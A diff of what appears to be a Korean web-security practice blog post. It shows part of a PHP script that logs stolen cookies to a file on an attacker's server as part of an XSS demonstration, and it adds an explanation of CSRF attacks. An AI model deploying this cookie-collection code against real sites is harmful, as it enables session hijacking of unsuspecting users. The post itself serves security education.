@@ -293,7 +293,7 @@ XSS 공격이 가능한것이 확인이 되어, 전 XSS 공격으로 `쿠키값`
 	$log=fopen("data.txt","a");
 	fwrite($log, $atime." ".$cookie."\r\n");
 	fclose($log);
-	echo "<img src=hackerDUN.png></img>";
+	echo "<img src=hacker.png></img>";
 ?>
 ```
 <figcaption>XSS 공격 코드 (2/2)</figcaption>
@@ -323,6 +323,14 @@ XSS 공격이 가능한것이 확인이 되어, 전 XSS 공격으로 `쿠키값`
 </figure>
 
 게시글을 읽는 사람은 `해커`의 웹 서버에 `cookie.php`를 읽고 `쿠키값이 탈취` 되며, 사진 창이 띄어지도록 하였고, `fopen`을 통하여 해커 `data.txt`에 시간, 쿠키값을 `저장`하도록 하였습니다.
+<br>
+##### <sup id="csrf">[[4]](#user-ref4)</sup> `CSRF` `: Cross Site Request Forgery`
+
+1. XSS와 동일한 원리로 게시판, 이메일 등 컨텐츠에 악성 스크립트 또는 HTML 태그 삽입
+2. 사용자 측 브라우저에서 삽입된 스크립트 또는 HTML 태그가 실행됨
+3. 공격자가 의도한 행위(CRUD)가 있는 위조된 HTTP 요청이 강제로 수행됨
+
+이번에도 `게시판`을 통해 `CSRF` 공격이 가능한지 확인해보겠습니다.
 
 <hr>
 
@@ -345,7 +353,13 @@ limit 함수는 문자열의 길이를 반환한다. 문장열의 길이를 알�
 <br>
 <br>
 <small id="user-ref3"><sup>[[3]](#xss)</sup> 웹 브라우저에서 사용자가 입력 할수 있는 input태그 등에 악의적인 script를 작성하여 해당 contents를 이용하는 다른 이용자의 개인정보 및 쿠키정보 탈취, 악성코드 감염, 웹 페이지 변조등의 공격을 한다.</small>
+<br>
+<br>
+<small id="user-ref4"><sup>[[4]](#csrf)</sup> 정의만 보면 앞서 알아봤던 XSS와 SQL injection과 비슷하다.
+<br>XSS가 사용자가 특정 사이트를 신뢰한다는 점을 공격하는거라면, CSRF는 특정 사이트가 사용자의 브라우저를 신뢰한다는 점을 공격하는 것이 다르다.
+<br>간단하게 정리하자면, 악성코드가 XSS: 클라이언트에서 발생 / CSRF: 서버에서 발생이라고 할 수 있다.</small>
 <hr>
 
 # 6. 참고자료
 https://lucete1230-cyberpolice.tistory.com/94
+https://velog.io/@codren/%EC%9B%B9-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%8B%A4%EC%8A%B5-2-CSRF
